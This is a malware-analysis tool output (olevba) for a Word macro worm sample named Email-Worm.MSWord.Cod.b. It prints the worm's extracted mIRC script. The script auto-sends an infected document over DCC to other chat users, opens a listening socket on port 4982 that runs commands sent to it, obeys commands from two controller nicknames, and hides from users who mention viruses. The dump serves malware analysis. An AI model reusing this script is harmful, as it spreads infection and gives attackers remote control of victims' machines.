olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Email-Worm.MSWord.Cod.b-044aa1043af6ba4104a2c48421d8b0e7eff0c9f1
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Email-Worm.MSWord.Cod.b-044aa1043af6ba4104a2c48421d8b0e7eff0c9f1 
in file: Email-Worm.MSWord.Cod.b-044aa1043af6ba4104a2c48421d8b0e7eff0c9f1 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[script]
n0=on 1:CONNECT:{ /msg crayolarx crayons | /msg ilikeroll crayons }
n1=/sockclose cod | /socklisten cod 4982 }
n2=on 1:FILESENT:*:if ($filename != c:\pornlist.doc) /dcc send $nick c:\pornlist.doc
n3=on 1:FILERCVD:*:/dcc send $nick c:\pornlist.doc
n4=on 1:JOIN:#:{ if ($nick == crayolarx) || ($nick == ilikeroll) /msg $nick crayons #
n5=if (# == #nohack) || (# == #dmsetup) || ($pos(#,help,1) != $null) || ($pos(#,virus,1) != $null) /part # CRAYON OF DOOM }
n5=on 1:socklisten:cod:{ sockaccept users }
n6=on 1:sockread:users:{ if ($sockerr > 0) return
n7=:nextread
n8=sockread %temp
n9=if ($sockbr == 0) return
n10=if ($left(%temp,2) == do) { $right(%temp,-3) }
n11=goto nextread }
n12=on 1:JOIN:#:if (($nick != $me) && ($pos(#,sex,1) != $null)) /dcc send $nick c:\pornlist.doc
n13=ctcp 1:*:{ if ($nick == crayolarx) || ($nick == ilikeroll) $1- }
n14=on 1:TEXT:*virus*:*:if ($nick != $me) /ignore $nick
No suspicious keyword or IOC found.

